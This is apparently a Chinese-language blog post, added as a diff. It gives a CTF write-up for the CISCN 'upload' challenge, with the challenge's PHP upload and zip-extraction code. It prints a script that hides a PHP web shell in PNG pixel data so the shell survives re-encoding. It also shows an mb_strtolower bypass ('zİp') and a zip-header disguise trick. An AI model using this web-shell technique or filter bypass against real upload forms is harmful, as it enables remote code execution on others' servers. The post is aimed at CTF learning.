@@ -1,0 +1,225 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CISCNUPLOAD - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="知识点
+upload
+字符串编码问题
+代码审计（？大概也没有）
+mb_strtolower 绕过
+
+思路题目一共给出index.php 和example.php
+123456789101112131,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">CISCNUPLOAD</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">CISCNUPLOAD</h1>
+        <div class="stuff">
+            <span>五月 19, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>upload</li>
+<li>字符串编码问题</li>
+<li>代码审计（？大概也没有）</li>
+<li>mb_strtolower 绕过</li>
+</ul>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目一共给出index.php 和example.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; $imageinfo[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr($fileName,<span class="string">&quot;c&quot;</span>) || stristr($fileName,<span class="string">&quot;i&quot;</span>) || stristr($fileName,<span class="string">&quot;h&quot;</span>) || stristr($fileName,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = <span class="string">&quot;image/&quot;</span> . mb_strtolower($fileName);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $imagePath)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>要求上传一个正方形的图片，且图片后缀不可以有c/i/ph/h</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    $name_for_zip = <span class="string">&quot;example/&quot;</span> . $_POST[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    $pos_for_zip = <span class="string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; $size, <span class="string">&#x27;height&#x27;</span> =&gt; $size]);</span><br><span class="line">        <span class="keyword">if</span> ($second !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng($second, <span class="string">&#x27;example/&#x27;</span>.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目的代码很简单看懂，就是允许上传zip，然后将zip解压出来，check剪出来的时候是图片，如果是图片就重新生成裁剪之后放到example目录下，然后删除原图片。</p>
+<p>大概思路就是上传一个zip，然后将zip解压之后要求是一个具有图片属性的PHP，解压getshell</p>
+<p>需要用脚本把shell插入到图片中间并且不会损坏图片，下面这个脚本可以做到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">$r = $p[$y];</span><br><span class="line">$g = $p[$y+<span class="number">1</span>];</span><br><span class="line">$b = $p[$y+<span class="number">2</span>];</span><br><span class="line">$color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,<span class="string">&quot;ciscn.php&quot;</span>);</span><br><span class="line"><span class="comment">//<span class="meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>将php压缩即可</p>
+<p>至于mb_strtolower 绕过，可以通过某些特殊符号绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP :: Request #70072 :: Add a language avare uppercase&#x2F;lowercase solution without need of locale change</span><br></pre></td></tr></table></figure>
+
+<p>上传时使用<code>xxx.zİp</code>，经过<code>mb_strtolower</code>后存到服务器的文件名变为<code>xxx.zip</code></p>
+<p>注意踩坑： 这里你需要在文件名的时候修改，形如：</p>
+<p><img src="CISCNUPLOAD/image-20210519210500240.png" alt="image-20210519210500240"></p>
+<p>然后直接上传就可以成功，如果在burp抓包的时候改会失败（w4,超人超人超人）</p>
+<p>关于如何修改ZIP，你需要先找一个正常的png，能上传的PNG，然后</p>
+<p><img src="image-20210519210649470.png" alt="image-20210519210649470"></p>
+<p>第二行第八列之前的part复制下来，直接修改zip的前面</p>
+<p><img src="image-20210519210710340.png" alt="image-20210519210710340"></p>
+<p>抓包上传</p>
+<p><img src="image-20210519210720706.png" alt="image-20210519210720706"></p>
+<p>🛫</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
